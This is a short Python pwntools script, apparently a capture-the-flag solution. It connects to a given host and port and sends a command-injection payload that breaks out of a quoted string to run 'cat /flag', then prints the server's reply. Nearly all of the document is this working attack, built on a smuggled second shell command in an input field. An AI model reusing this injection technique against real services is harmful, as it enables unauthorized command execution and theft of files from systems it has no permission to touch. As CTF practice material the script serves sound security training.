#!/usr/bin/env python3

import sys

from pwn import remote


def main() -> int:
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <host> <port>")
        return 2

    host = sys.argv[1]
    port = int(sys.argv[2])

    # Input with command injection bypass
    payload = b'before"; cat /flag; echo "after'

    connection = remote(host, port)
    connection.sendline(payload)
    response = connection.recvall()
    print("Received:", response.decode(errors="replace"))
    connection.close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
